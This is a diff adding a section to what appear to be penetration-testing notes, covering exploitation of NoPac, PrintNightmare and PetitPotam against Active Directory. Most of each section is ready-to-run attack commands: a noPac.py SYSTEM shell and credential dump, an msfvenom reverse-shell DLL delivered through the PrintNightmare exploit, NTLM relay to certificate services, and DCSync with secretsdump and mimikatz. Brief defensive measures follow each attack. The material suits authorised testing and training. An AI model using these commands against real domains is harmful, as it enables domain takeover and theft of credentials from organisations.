@@ -2547,3 +2547,288 @@ Tools such as **BloodHound**, **PowerView**, and **PowerUpSQL** can identify and
 
 ---
 
+# Bleeding Edge Vulnerabilities
+
+#### **Overview**
+Bleeding-edge vulnerabilities represent newly discovered weaknesses in systems that attackers can exploit before organizations have fully implemented patches or defensive measures. These vulnerabilities often provide an edge in **penetration testing** by leveraging recent exploits that may not yet be widely known or mitigated. While powerful, these techniques require a solid understanding of the potential risks, as they can lead to service disruptions if misused.
+
+#### **Key Considerations:**
+1. **Organizational Challenges:**
+   - Many organizations delay patch rollouts due to compatibility concerns, lack of resources, or operational constraints. This delay creates opportunities for attackers.
+   - Security practitioners must understand these vulnerabilities thoroughly before testing them in production environments.
+
+2. **Risks of Exploitation:**
+   - While some techniques (e.g., NoPac, PrintNightmare) are considered less destructive than older vulnerabilities like **Zerologon** or **DCShadow**, they still carry risks.
+   - Examples include potential service crashes (e.g., Print Spooler issues in PrintNightmare) or triggering security alerts.
+
+3. **Lab Environment Testing:**
+   - It is essential to test these techniques in controlled environments to understand their implications.
+   - Use tools like **Rubeus**, **Mimikatz**, and **Impacket** to simulate attacks and develop a solid methodology.
+
+4. **Professionalism in Assessments:**
+   - Document steps thoroughly.
+   - Communicate findings and risks clearly with stakeholders.
+   - Respect organizational policies and avoid causing unintended disruptions.
+
+---
+
+## **Vulnerabilities Covered**
+
+---
+
+#### **1. NoPac (SamAccountName Spoofing)**
+**Key Details:**
+- **Vulnerability:** A combination of two CVEs:
+  - **CVE-2021-42278:** A bypass vulnerability in the **Security Account Manager (SAM)**.
+  - **CVE-2021-42287:** A flaw in the **Kerberos Privilege Attribute Certificate (PAC)**.
+- **Discovered:** Late 2021.
+- **Impact:** Enables escalation from a standard domain user to **Domain Admin** privileges in a single command.
+- **Mechanism:** Exploits the ability of domain users to rename machine accounts to impersonate a **Domain Controller (DC)**, manipulating Kerberos ticket issuance.
+
+**Attack Flow:**
+1. By default, domain users can add up to 10 machines to the domain.
+2. The attacker renames a machine account to match a DC’s `SamAccountName`.
+3. When Kerberos issues a **Ticket Granting Service (TGS)**, it matches the renamed machine account to the DC and grants elevated privileges.
+4. This allows the attacker to impersonate the DC, execute commands as **NT AUTHORITY\SYSTEM**, or perform **DCSync** attacks to extract sensitive credentials.
+
+**Steps to Exploit:**
+1. **Preparation:**
+   - Clone and install required tools:
+     ```bash
+     git clone https://github.com/SecureAuthCorp/impacket.git
+     python setup.py install
+     git clone https://github.com/Ridter/noPac.git
+     ```
+   
+2. **Scan for Vulnerability:**
+   - Use `scanner.py` to check if the target is vulnerable:
+     ```bash
+     python3 scanner.py domain/username:password -dc-ip <DC_IP> -use-ldap
+     ```
+   - Indicators of vulnerability:
+     - `ms-DS-MachineAccountQuota` is > 0 (default is 10).
+     - TGT is successfully obtained.
+
+3. **Exploit:**
+   - Gain a SYSTEM shell:
+     ```bash
+     python3 noPac.py domain/username:password -dc-ip <DC_IP> -dc-host <DC_HOST> -shell --impersonate administrator -use-ldap
+     ```
+   - Save and use TGT tickets for additional attacks:
+     - Example: **DCSync attack**:
+       ```bash
+       python3 noPac.py domain/username:password -dc-ip <DC_IP> -dc-host <DC_HOST> --impersonate administrator -dump
+       ```
+
+**Post-Exploitation Considerations:**
+- Clean up artifacts like `.ccache` files to avoid leaving traces.
+- Review saved tickets for extended attacks like Pass-the-Ticket.
+
+**Defensive Measures:**
+- Set `ms-DS-MachineAccountQuota = 0` to prevent users from adding machine accounts.
+- Regularly audit and monitor Kerberos ticket activity for anomalies.
+
+---
+
+#### **2. PrintNightmare**
+**Key Details:**
+- **Vulnerability:** Exploits flaws in the **Print Spooler service**:
+  - **CVE-2021-34527**: Remote code execution.
+  - **CVE-2021-1675**: Privilege escalation.
+- **Discovered:** 2021.
+- **Impact:** Provides an attacker with **SYSTEM-level privileges** by uploading and executing malicious DLLs remotely.
+- **Mechanism:** Uses vulnerable **MS-RPRN** and **MS-PAR** protocols to manipulate the Print Spooler.
+
+**Attack Flow:**
+1. **Check MS-RPRN Availability:**
+   - Use `rpcdump.py` to enumerate exposed protocols:
+     ```bash
+     rpcdump.py @<target_IP> | egrep 'MS-RPRN|MS-PAR'
+     ```
+   
+2. **Prepare Payload:**
+   - Generate a malicious DLL using `msfvenom`:
+     ```bash
+     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll > payload.dll
+     ```
+
+3. **Host Payload:**
+   - Use `smbserver.py` to host the payload:
+     ```bash
+     smbserver.py -smb2support <ShareName> /path/to/payload.dll
+     ```
+
+4. **Execute Exploit:**
+   - Run the exploit script against the target:
+     ```bash
+     python3 CVE-2021-1675.py domain/username:password@<target_IP> '\\<host_IP>\<ShareName>\payload.dll'
+     ```
+   - If successful, the target will execute the payload and call back to the attacker's handler, granting a SYSTEM shell.
+
+**Post-Exploitation Considerations:**
+- Clean up payloads and temporary files.
+- Use `Meterpreter` to extend post-exploitation activities.
+
+**Defensive Measures:**
+- Disable the Print Spooler service on non-essential systems.
+- Apply the latest patches from Microsoft to secure the Print Spooler.
+
+---
+### PetitPotam (MS-EFSRPC)
+ **Overview**
+
+PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability that abuses **Microsoft Encrypting File System Remote Protocol (MS-EFSRPC)** to coerce a **Domain Controller (DC)** to authenticate against a malicious host. By relaying this authentication (using NTLM), attackers can exploit environments with **Active Directory Certificate Services (AD CS)** enabled, potentially gaining full domain control.
+
+
+#### **PetitPotam Attack Flow**
+
+1. **Core Concept:**
+   - Coerces the DC to authenticate to an attacker's host using **LSARPC** (via port 445).
+   - Relays the NTLM authentication to a CA Web Enrollment service.
+   - Captures a certificate that can be used to request a **Ticket-Granting Ticket (TGT)** for the DC.
+   - Uses the TGT to perform privileged operations, such as **DCSync**.
+
+2. **Tools Required:**
+   - **PetitPotam.py** or its equivalents (Mimikatz, PowerShell scripts).
+   - **Impacket tools**: ntlmrelayx.py, secretsdump.py.
+   - **PKINITtools**: gettgtpkinit.py, getnthash.py.
+   - **Rubeus** (optional, for Windows-based attacks).
+
+
+
+#### **Exploitation Methods**
+
+
+
+##### **1. Using PetitPotam.py**
+1. **Start NTLM Relaying:**
+   - Run ntlmrelayx.py on the attack host to target the CA Web Enrollment URL:
+     ```bash
+     sudo ntlmrelayx.py -debug -smb2support --target http://<CA_Host>/certsrv/certfnsh.asp --adcs --template DomainController
+     ```
+
+2. **Trigger Authentication with PetitPotam:**
+   - Use PetitPotam to coerce the DC to authenticate to the attacker's NTLM relay server:
+     ```bash
+     python3 PetitPotam.py <attack_host_IP> <DC_IP>
+     ```
+
+
+
+##### **2. Using Mimikatz**
+Mimikatz includes the ability to coerce DC authentication using its **EFS module**.
+
+1. **Command to Coerce Authentication:**
+   Run the following command from Mimikatz:
+   ```bash
+   misc::efs /server:<DC_IP> /connect:<attack_host_IP>
+   ```
+
+   - **/server:** IP or hostname of the Domain Controller.
+   - **/connect:** IP or hostname of the attacker’s NTLM relay server.
+
+2. **Expected Result:**
+   - Mimikatz forces the DC to connect to the attacker's relay server.
+   - If ntlmrelayx.py is running on the attack host, it captures the authentication and requests a certificate.
+
+
+
+##### **3. Using PowerShell**
+Alternatively, a PowerShell implementation of PetitPotam (`Invoke-PetitPotam.ps1`) can also be used to achieve the same result.
+
+1. **Trigger Authentication:**
+   - From a PowerShell session:
+     ```powershell
+     Invoke-PetitPotam -Target <DC_IP> -AttackerIP <attack_host_IP>
+     ```
+
+
+
+##### **Post-Authentication Steps**
+
+1. **Captured Certificate:**
+   - If successful, ntlmrelayx.py captures a Base64-encoded certificate for the targeted DC.
+
+2. **Request a TGT Using PKINIT:**
+   - Use gettgtpkinit.py to request a TGT with the captured certificate:
+     ```bash
+     python3 /opt/PKINITtools/gettgtpkinit.py <domain>/<DC_machine_account>$ -pfx-base64 <Base64_Certificate> <output_file>
+     ```
+
+3. **Set the TGT for Authentication:**
+   - Export the `.ccache` file to the Kerberos environment:
+     ```bash
+     export KRB5CCNAME=dc01.ccache
+     ```
+
+4. **Perform a DCSync Attack:**
+   - Use secretsdump.py to retrieve sensitive credentials:
+     ```bash
+     secretsdump.py -just-dc-user <domain>/administrator -k -no-pass <DC_machine_account>@<DC_FQDN>
+     ```
+
+
+##### **Advanced Usage: Mimikatz for DCSync**
+
+Once authentication is coerced and a valid Kerberos ticket is available, Mimikatz can be used to perform a **DCSync attack**.
+
+1. **Start Mimikatz:**
+   - Run Mimikatz on a privileged Windows machine:
+     ```bash
+     mimikatz.exe
+     ```
+
+2. **Perform DCSync:**
+   - Dump the **KRBTGT** account hash or other sensitive credentials:
+     ```bash
+     lsadump::dcsync /user:<domain>\<target_user>
+     ```
+
+   Example:
+   ```bash
+   lsadump::dcsync /user:inlanefreight\krbtgt
+   ```
+
+3. **Expected Output:**
+   - NTLM hash, LM hash, and Kerberos keys for the target user are retrieved:
+     ```
+     Credentials:
+       Hash NTLM: 16e26ba33e455a8c338142af8d89ffbc
+     ```
+
+
+
+##### **Alternate Routes for Exploitation**
+
+1. **Retrieve NT Hash Using Kerberos U2U:**
+   - Use `getnthash.py` with the AS-REP encryption key:
+     ```bash
+     python3 /opt/PKINITtools/getnthash.py -key <AS-REP_Encryption_Key> <domain>/<DC_machine_account>$
+     ```
+
+2. **Perform Pass-the-Ticket with Rubeus:**
+   - Request a TGT and inject it into memory:
+     ```powershell
+     Rubeus.exe asktgt /user:<DC_machine_account>$ /certificate:<Base64_Certificate> /ptt
+     ```
+
+
+
+### **Defensive Measures**
+
+1. **Patch Hosts:**
+   - Apply Microsoft’s **CVE-2021-36942** patch to fix the vulnerability.
+
+2. **Harden AD CS:**
+   - Require **Extended Protection for Authentication** and enable **SSL/TLS** for Web Enrollment services.
+
+3. **Restrict NTLM:**
+   - Disable NTLM on Domain Controllers, AD CS servers, and IIS hosting Web Enrollment.
+
+4. **Monitor for Abnormal Behavior:**
+   - Look for NTLM relay indicators, such as:
+     - Unexpected NTLM authentication events.
+     - Unusual certificate requests.
+
+---
+
